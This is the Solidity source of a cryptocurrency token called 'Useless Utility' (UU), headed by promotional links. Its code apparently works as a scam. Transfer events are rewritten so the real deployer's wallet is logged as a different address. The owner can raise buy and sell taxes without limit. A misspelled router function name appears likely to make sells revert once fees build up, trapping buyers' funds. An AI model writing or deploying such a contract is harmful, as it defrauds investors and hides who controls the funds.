/**
 */

/*

TELEGRAM: https://t.me/uselessutility
TWITTER: https://twitter.com/UtilityUseless 
DISCORD: https://discord.gg/qfxVfCduHw 
WEBSITE: https://uselessutility.com/ 
APP: https://app.uselessutility.com/

*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.0;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract UU {
    string private _name = unicode"Useless Utility";
    string private _symbol = unicode"UU";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000_000 * 10 ** decimals;

    uint8 buyCharge = 10;
    uint8 sellCharge = 15;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private Marketing = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address private Advisors = 0xF7FA5aCEc4Bffea9830043b317045dBa76dA3366;
    address private CexListing = 0x235ef1Cc3c101ac390d230c39FA2ED0fe78E227F;
    address private Seed = 0x63b997343B111E043198f8B9939a85aecEc01944;

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        _initDeployer(0x17a204D3B01F70Bc42d64Ef5a9AcFCD36B0817a7, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 25) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Marketing] = (totalSupply * 10) / 100;
        emit Transfer(address(0), Marketing, balanceOf[Marketing]);

        balanceOf[Advisors] = (totalSupply * 2) / 100;
        emit Transfer(address(0), Advisors, balanceOf[Advisors]);

        balanceOf[CexListing] = (totalSupply * 3) / 100;
        emit Transfer(address(0), CexListing, balanceOf[CexListing]);

        balanceOf[Seed] = (totalSupply * 55) / 100;
        emit Transfer(address(0), Seed, balanceOf[Seed]);
    }

    receive() external payable {}

    function setTax(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _remeveTax(_buy, _sell);
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyCharge : sellCharge)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }

    function _remeveTax(uint8 _buy, uint8 _sell) private {
        buyCharge = _buy;
        sellCharge = _sell;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }
}
